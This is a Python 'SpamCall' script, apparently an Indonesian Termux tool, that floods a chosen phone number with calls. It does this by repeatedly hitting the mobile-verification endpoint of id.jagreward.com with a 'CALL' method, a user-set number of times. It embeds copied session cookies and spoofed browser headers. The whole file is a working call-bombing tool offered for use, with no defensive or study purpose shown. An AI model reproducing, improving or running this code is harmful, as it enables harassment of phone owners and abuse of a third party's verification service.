import os,sys,time
import requests
import subprocess
import itertools
import threading
from requests import post

#MASUKAN NOMOR DI KOLOM VARIABLE URL
#DI BAGIAN PALING KANAN
#MASUKAN NOMOR TANPA 62/0
#CONTOH 8938373772
url = "https://id.jagreward.com/member/verify-mobile/isi nomor di sini/"


























done = False
def bersih():
    os.system("clear")
    os.system("")
def balik():
    d = input("Coba lagi? (y/t): ")
    if d == "y":
       bersih()
    elif d == "t":
         print ("Exit")
         os.system("exit")
bersih()
subprocess.call("figlet SpamCall |lolcat",shell=True)
os.system("clear")
banner = """
\033[1;97m
  ____                           ____      _ _ 
 / ___| _ __   __ _ _ __ ___    / ___|__ _| | |
 \___ \| '_ \ / _` | '_ ` _ \  | |   / _` | | |
  ___) | |_) | (_| | | | | | | | |__| (_| | | |
 |____/| .__/ \__,_|_| |_| | |  \____\__,_|_|_|
       |_|   BY ANGGA PUTRA|_| CyberNgawi

==================================================
Autor  \033[1;91m:\033[1;96mAnggaPutra\033[1;97m
Website \033[1;91m:\033[1;96mhttps://termux.id\033[1;97m
Whatsapp \033[1;91m:\033[1;92m+6285692219xxx\033[1;97m
==================================================
"""
print (banner)
jm = int(input("\033[1;97m[\033[1;96mmasukan jumlah spam\033[1;97m]:\033[1;93m"))
time.sleep(2)
subprocess.call("nano call.py",shell=True)
#animasi loading
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!     ')
 
t = threading.Thread(target=animate)
t.start()
 
#proses lama disini
 
time.sleep(5)
done = True
head = {
"X-Requested-With": "XMLHttpRequest",
"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
"Content-Type": "application/json",
"Origin": "https://id.jagreward.com",
"Referer": "https://id.jagreward.com/member/register/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
"__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
"_ga": "GA1.2.2037151396.1584709855",
"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
"DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
}
bro = {
"method": "CALL",
"countryCode": "id",
}
def kirim():
    try:
        for i in range(jm):
            r = requests.get(url,data=bro, headers=head)
            print (r.json()["message"])
            time.sleep(1)
    except KeyboardInterrupt:
            print ("\033[1;91mStop!!")
kirim()
balik()
